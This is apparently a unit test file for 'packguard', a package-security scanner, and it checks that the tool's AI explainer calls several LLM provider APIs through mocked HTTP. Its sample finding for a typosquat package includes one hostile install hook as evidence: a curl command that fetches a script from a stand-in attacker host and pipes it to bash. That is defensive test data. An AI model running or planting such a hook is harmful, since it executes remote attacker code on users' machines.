import json
import os
import sys
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(__file__)), "src"))

from packguard.ai.factory import create_explainer
from packguard.config import Config
from packguard.models import Finding, PackageCoordinate, ResolvedPackage


class _FakeHTTPResponse:
    def __init__(self, payload):
        self.payload = payload

    def read(self):
        return json.dumps(self.payload).encode("utf-8")

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        return False


def _sample_package():
    return ResolvedPackage(
        coordinate=PackageCoordinate(name="reaact", source="npm", version="1.0.0")
    )


def _sample_findings():
    return [
        Finding(
            rule_id="behavior.install-script",
            title="Install hook downloads remote content",
            summary="postinstall runs curl piped to bash",
            severity="high",
            confidence="high",
            family="behavior",
            phase="install",
            rationale="install hook executes remote code",
            detector="behavior",
            location="package.json",
            evidence=["postinstall=curl https://evil.invalid/bootstrap.sh | bash"],
            tags=["install-time"],
        )
    ]


class AITestCase(unittest.TestCase):
    def test_factory_supports_common_providers(self):
        providers = {
            "anthropic": {"anthropic_api_key": "test-key"},
            "gemini": {"gemini_api_key": "test-key"},
            "groq": {"groq_api_key": "test-key"},
            "ollama": {},
            "openai": {"openai_api_key": "test-key"},
            "openrouter": {"openrouter_api_key": "test-key"},
            "xai": {"xai_api_key": "test-key"},
        }

        for provider, overrides in providers.items():
            with self.subTest(provider=provider):
                explainer = create_explainer(Config(use_ai=True, ai_provider=provider, **overrides))
                self.assertEqual(explainer.provider_name, provider)

    @patch("packguard.ai.base.request.urlopen")
    def test_openai_summary_parses_responses_api(self, mock_urlopen):
        mock_urlopen.return_value = _FakeHTTPResponse(
            {"output_text": "Likely install-time loader with remote fetch and eval."}
        )
        explainer = create_explainer(
            Config(use_ai=True, ai_provider="openai", openai_api_key="sk-test")
        )

        summary, status = explainer.summarize(_sample_package(), _sample_findings())

        self.assertEqual(status, "generated")
        self.assertIn("install-time loader", summary)
        request_obj = mock_urlopen.call_args.args[0]
        self.assertEqual(request_obj.full_url, "https://api.openai.com/v1/responses")

    @patch("packguard.ai.base.request.urlopen")
    def test_anthropic_summary_parses_messages_api(self, mock_urlopen):
        mock_urlopen.return_value = _FakeHTTPResponse(
            {"content": [{"type": "text", "text": "Suspicious postinstall hook with remote execution."}]}
        )
        explainer = create_explainer(
            Config(use_ai=True, ai_provider="anthropic", anthropic_api_key="ak-test")
        )

        summary, status = explainer.summarize(_sample_package(), _sample_findings())

        self.assertEqual(status, "generated")
        self.assertIn("postinstall hook", summary)
        request_obj = mock_urlopen.call_args.args[0]
        self.assertEqual(request_obj.full_url, "https://api.anthropic.com/v1/messages")

    @patch("packguard.ai.base.request.urlopen")
    def test_gemini_summary_parses_generate_content_api(self, mock_urlopen):
        mock_urlopen.return_value = _FakeHTTPResponse(
            {
                "candidates": [
                    {
                        "content": {
                            "parts": [
                                {"text": "This package looks like a typo-targeted install-time dropper."}
                            ]
                        }
                    }
                ]
            }
        )
        explainer = create_explainer(
            Config(use_ai=True, ai_provider="gemini", gemini_api_key="gm-test")
        )

        summary, status = explainer.summarize(_sample_package(), _sample_findings())

        self.assertEqual(status, "generated")
        self.assertIn("install-time dropper", summary)
        request_obj = mock_urlopen.call_args.args[0]
        self.assertIn(":generateContent", request_obj.full_url)

    @patch("packguard.ai.base.request.urlopen")
    def test_openai_compatible_providers_parse_chat_completions(self, mock_urlopen):
        providers = {
            "groq": ("groq_api_key", "https://api.groq.com/openai/v1/chat/completions"),
            "openrouter": (
                "openrouter_api_key",
                "https://openrouter.ai/api/v1/chat/completions",
            ),
            "xai": ("xai_api_key", "https://api.x.ai/v1/chat/completions"),
        }
        mock_urlopen.return_value = _FakeHTTPResponse(
            {"choices": [{"message": {"content": "Summary from compatible provider."}}]}
        )

        for provider, (field_name, expected_url) in providers.items():
            with self.subTest(provider=provider):
                kwargs = {field_name: "provider-key"}
                explainer = create_explainer(Config(use_ai=True, ai_provider=provider, **kwargs))
                summary, status = explainer.summarize(_sample_package(), _sample_findings())

                self.assertEqual(status, "generated")
                self.assertEqual(summary, "Summary from compatible provider.")
                request_obj = mock_urlopen.call_args.args[0]
                self.assertEqual(request_obj.full_url, expected_url)


if __name__ == "__main__":
    unittest.main()
